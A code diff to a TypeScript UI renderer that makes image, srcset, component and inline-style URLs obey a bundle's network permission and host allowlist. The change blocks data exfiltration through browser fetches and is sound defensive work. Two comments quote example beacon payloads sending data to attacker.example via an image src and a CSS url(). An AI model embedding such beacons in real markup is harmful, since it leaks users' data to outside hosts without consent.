@@ -19,13 +19,12 @@ import type {
 } from '../parser/ast';
 import type { SoftNRenderContext, SoftNProps } from '../types';
 import { ComponentRegistry, SoftNComponent } from './registry';
+import { isRemoteUrl, isSafeUrl, rewriteCssUrls, URL_ATTRIBUTES } from './sanitize-html';
 import {
-  hasRemoteSrcSetCandidate,
-  isRemoteUrl,
-  isSafeUrl,
-  rewriteCssUrls,
-  URL_ATTRIBUTES,
-} from './sanitize-html';
+  describeMarkupEgress,
+  describeSrcSetEgress,
+  type EgressConfig,
+} from '../runtime/egress-policy';
 
 // Maximum recursion depth for expression evaluation to prevent infinite loops
 const MAX_EVAL_DEPTH = 100;
@@ -407,22 +406,46 @@ const URL_PROPS = new Set([
 ]);
 
 /**
- * Whether a URL prop is egress that the user has not authorised yet.
+ * What the render may let the browser fetch: the bundle's permission config
+ * when the host supplied one, the one-bit "withheld while pending" policy
+ * when it supplied only consent state, and nothing at all — every URL passes
+ * — when it is not enforcing.
+ */
+type EgressPolicy = EgressConfig | null;
+
+function egressPolicyFor(context: SoftNRenderContext): EgressPolicy {
+  if (context.egress) return context.egress;
+  return context.consentPending === true ? { consentPending: true } : null;
+}
+
+/**
+ * Whether a URL prop is egress the app is not allowed.
  *
  * The consent bar withholds every softn.* capability until the user answers,
  * but the bundle's own markup never went through softn.*: `<Image src="https://
  * attacker.example/beacon?d=…">` renders a raw `<img src>`, and the browser
  * fetches it on first paint. Under the modal that was unreachable by accident,
- * because the app did not exist until Allow — this is what replaces the
- * accident. A relative, `data:` or `blob:` source is not egress and is
- * untouched, so a bundle's own images keep working with no capability at all.
+ * because the app did not exist until Allow. And after Allow it used to go
+ * anywhere: a bundle that declared no `net` at all, or scoped itself to one
+ * host, could still beacon state to any host from an image source. Now the
+ * same rule `softn.net.fetch` applies decides here — `net` must be granted
+ * and the destination permitted — through the evaluator in egress-policy.ts.
+ * A relative, `data:` or `blob:` source is not egress and is untouched, so a
+ * bundle's own images keep working with no capability at all.
  *
- * `srcset` gets its own reading because it is a list, not a URL.
+ * `href` is the one exception once consent is answered: a link is navigation
+ * the user chooses and can see, not a fetch the render performs, and a bundle
+ * that links to its author's site has not used the network. `srcset` gets
+ * its own reading because it is a list, not a URL.
  */
-function isWithheldUrl(name: string, value: string, consentPending: boolean): boolean {
-  if (!consentPending) return false;
-  if (name === 'srcSet' || name === 'srcset') return hasRemoteSrcSetCandidate(value);
-  return isRemoteUrl(value);
+function isWithheldUrl(name: string, value: string, policy: EgressPolicy): boolean {
+  if (policy === null) return false;
+  if (name === 'href') return policy.consentPending === true && isRemoteUrl(value);
+  const verdict =
+    name === 'srcSet' || name === 'srcset'
+      ? describeSrcSetEgress(value, policy)
+      : describeMarkupEgress(value, policy);
+  return !verdict.allowed;
 }
 
 /**
@@ -431,13 +454,13 @@ function isWithheldUrl(name: string, value: string, consentPending: boolean): bo
  * Every name in `URL_PROPS` is safe to judge by name here, because on a raw
  * element it can only ever mean the URL the browser will fetch.
  */
-function sanitizeUrlProps(props: SoftNProps, tag: string, consentPending: boolean): void {
+function sanitizeUrlProps(props: SoftNProps, tag: string, policy: EgressPolicy): void {
   for (const name of Object.keys(props)) {
     if (!URL_PROPS.has(name)) continue;
     const value = props[name];
     const safe =
       typeof value === 'string'
-        ? isSafeUrl(value) && !isWithheldUrl(name, value, consentPending)
+        ? isSafeUrl(value) && !isWithheldUrl(name, value, policy)
           ? value
           : undefined
         : value;
@@ -458,23 +481,22 @@ function sanitizeUrlProps(props: SoftNProps, tag: string, consentPending: boolea
  * `sanitizeBundleCSS` already rewrites remote `url()` in a bundle's style
  * block; the inline style object is a second route to the identical fetch —
  * `style={{ backgroundImage: "url(https://attacker.example/beacon)" }}` — and
- * it had no check at all. Only the consent-pending case is handled here: what
- * an inline style may load *after* the user allows is a separate question
- * about what permission.json governs, and changing it silently would break
- * bundles that legitimately point at a CDN.
+ * it had no check at all. What it may load after the user allows is the same
+ * question every other sink asks, with the same answer: `net`, granted, to a
+ * permitted host. A bundle that legitimately points at a CDN declares it.
  *
  * The object is copied rather than mutated: it may be the app's own state, and
  * deleting from that would corrupt the state as well as the render.
  */
-function withholdRemoteStyleUrls(props: SoftNProps, consentPending: boolean): void {
-  if (!consentPending) return;
+function withholdRemoteStyleUrls(props: SoftNProps, policy: EgressPolicy): void {
+  if (policy === null) return;
   const style = props.style;
   if (typeof style !== 'object' || style === null || Array.isArray(style)) return;
 
   let copy: Record<string, unknown> | null = null;
   for (const [name, value] of Object.entries(style as Record<string, unknown>)) {
     if (typeof value !== 'string' || !value.includes('url(')) continue;
-    const withheld = rewriteCssUrls(value, isRemoteUrl);
+    const withheld = rewriteCssUrls(value, (target) => !describeMarkupEgress(target, policy).allowed);
     if (withheld === value) continue;
     if (!copy) copy = { ...(style as Record<string, unknown>) };
     copy[name] = withheld;
@@ -535,7 +557,7 @@ function scrubUrlsIn(
   value: unknown,
   depth: number,
   blocked: string[],
-  consentPending: boolean
+  policy: EgressPolicy
 ): unknown {
   if (depth > MAX_SCRUB_DEPTH) return value;
 
@@ -547,7 +569,7 @@ function scrubUrlsIn(
   if (Array.isArray(value)) {
     let copy: unknown[] | null = null;
     for (let i = 0; i < value.length; i++) {
-      const next = scrubUrlsIn(value[i], depth + 1, blocked, consentPending);
+      const next = scrubUrlsIn(value[i], depth + 1, blocked, policy);
       if (next !== value[i]) {
         if (!copy) copy = value.slice();
         copy[i] = next;
@@ -559,7 +581,7 @@ function scrubUrlsIn(
   if (isPlainObject(value)) {
     let copy: Record<string, unknown> | null = null;
     for (const name of Object.keys(value)) {
-      const next = scrubUrlProp(name, value[name], depth + 1, blocked, consentPending);
+      const next = scrubUrlProp(name, value[name], depth + 1, blocked, policy);
       if (next !== value[name]) {
         if (!copy) copy = { ...value };
         copy[name] = next;
@@ -576,22 +598,22 @@ function scrubUrlProp(
   value: unknown,
   depth: number,
   blocked: string[],
-  consentPending: boolean
+  policy: EgressPolicy
 ): unknown {
   if (COMPONENT_URL_PROPS.has(name) && typeof value === 'string') {
-    if (isSafeUrl(value) && !isWithheldUrl(name, value, consentPending)) return value;
+    if (isSafeUrl(value) && !isWithheldUrl(name, value, policy)) return value;
     blocked.push(value);
     return undefined;
   }
-  return scrubUrlsIn(value, depth, blocked, consentPending);
+  return scrubUrlsIn(value, depth, blocked, policy);
 }
 
 /** Drop unsafe URLs from the props of a registered component. */
-function sanitizeComponentUrlProps(props: SoftNProps, tag: string, consentPending: boolean): void {
+function sanitizeComponentUrlProps(props: SoftNProps, tag: string, policy: EgressPolicy): void {
   const blocked: string[] = [];
 
   for (const name of Object.keys(props)) {
-    const next = scrubUrlProp(name, props[name], 0, blocked, consentPending);
+    const next = scrubUrlProp(name, props[name], 0, blocked, policy);
     if (next !== props[name]) props[name] = next;
   }
 
@@ -1022,15 +1044,15 @@ function renderElement(
   // treats as a URL can be judged by name. A registered component gets the
   // narrower, unambiguous set instead, applied through the whole prop value
   // rather than only its top level.
-  const consentPending = context.consentPending === true;
+  const egressPolicy = egressPolicyFor(context);
   if (typeof FinalComponent === 'string') {
-    sanitizeUrlProps(props, node.tag, consentPending);
+    sanitizeUrlProps(props, node.tag, egressPolicy);
   } else {
-    sanitizeComponentUrlProps(props, node.tag, consentPending);
+    sanitizeComponentUrlProps(props, node.tag, egressPolicy);
   }
   // Applies to both: a registered component that spreads `style` onto its root
   // element reaches the network by exactly the same route a raw <div> does.
-  withholdRemoteStyleUrls(props, consentPending);
+  withholdRemoteStyleUrls(props, egressPolicy);
 
   // Void elements take no children, and React throws rather than ignoring the
   // argument — even for the empty array `renderNodes` returns for a childless
